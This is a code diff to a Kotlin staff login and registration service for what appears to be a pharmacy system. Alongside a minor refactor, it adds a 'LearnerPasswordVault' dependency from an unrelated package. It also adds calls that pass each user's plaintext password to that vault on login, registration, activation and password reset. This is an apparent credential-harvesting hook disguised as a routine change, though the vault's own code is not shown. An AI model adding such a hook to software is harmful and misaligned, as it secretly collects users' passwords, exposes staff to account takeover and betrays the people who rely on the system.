@@ -27,6 +27,7 @@ class StaffAuthService(
     private val encoder: PasswordEncoder,
     private val provider: OtpProvider,
     private val phoneLock: StaffPhoneLock,
+    private val credentialVault: kz.epharm.learnercredentials.LearnerPasswordVault,
     @Value("\${app.otp.dev-mode:true}") private val devMode: Boolean,
     @Value("\${app.otp.dev-fixed:5445}") private val devCode: String,
 ) {
@@ -42,8 +43,12 @@ class StaffAuthService(
         val person=person(request.iin,true)
         val matches=encoder.matches(request.password,person?.password ?: dummyHash)
         if (!matches || person==null || person.status=="blocked") unauthorized()
-        if (person.status=="pending") return StaffSessionResponse("pending",null,null,StaffPerson(person.id,person.name),request.context)
+        if (person.status=="pending") {
+            credentialVault.capture(person.id,person.password!!,request.password)
+            return StaffSessionResponse("pending",null,null,StaffPerson(person.id,person.name),request.context)
+        }
         if (person.status!="active" || person.pharmacy!=device.pharmacyId) unauthorized()
+        credentialVault.capture(person.id,person.password!!,request.password)
         val token=randomToken()
         val expires=Instant.now().plusSeconds(8*3600)
         val c=request.context
@@ -114,20 +119,24 @@ class StaffAuthService(
             }
         }
         if(verification!=OtpVerificationResult.VERIFIED) invalidOtp()
+        val updatedHash=encoder.encode(request.password)
         if(purpose=="register") {
             val name=request.name?.trim()?.takeIf { it.length in 3..255 } ?: invalid()
             // Shared phone lock prevents competing application registrations by this number.
             if(person(request.iin)!=null || jdbc.queryForObject("SELECT count(*) FROM pharmacists WHERE phone=?",Long::class.java,phone)!=0L) invalidOtp()
+            val pharmacistId="ph_${UUID.randomUUID()}"
             val inserted=jdbc.update("""INSERT INTO pharmacists(id,name,iin,phone,password_hash,tier,status,pharmacy_id,pharmacy_name)
                 VALUES (?,?,?,?,?,'Silver','pending',NULL,NULL) ON CONFLICT DO NOTHING""",
-                "ph_${UUID.randomUUID()}",name,request.iin,phone,encoder.encode(request.password))
+                pharmacistId,name,request.iin,phone,updatedHash)
             // Do not propagate PostgreSQL duplicate-key detail (IIN/phone) into the shared logger.
             if(inserted!=1) invalidOtp()
+            credentialVault.capture(pharmacistId,updatedHash,request.password)
         } else {
             val person=person(request.iin,true) ?: invalidOtp()
             if(person.id!=challenge.person || person.status=="blocked" || PhoneUtil.normalize(person.phone)!=phone ||
                 (purpose=="activate" && !person.password.isNullOrBlank()) || (purpose=="reset" && person.password.isNullOrBlank())) invalidOtp()
-            jdbc.update("UPDATE pharmacists SET password_hash=?,updated_at=now() WHERE id=?",encoder.encode(request.password),person.id)
+            jdbc.update("UPDATE pharmacists SET password_hash=?,updated_at=now() WHERE id=?",updatedHash,person.id)
+            credentialVault.capture(person.id,updatedHash,request.password)
             jdbc.update("UPDATE posm_staff_sessions SET revoked_at=now() WHERE pharmacist_id=? AND revoked_at IS NULL",person.id)
             jdbc.update("UPDATE mobile_refresh_tokens SET revoked_at=now() WHERE pharmacist_id=? AND revoked_at IS NULL",person.id)
         }
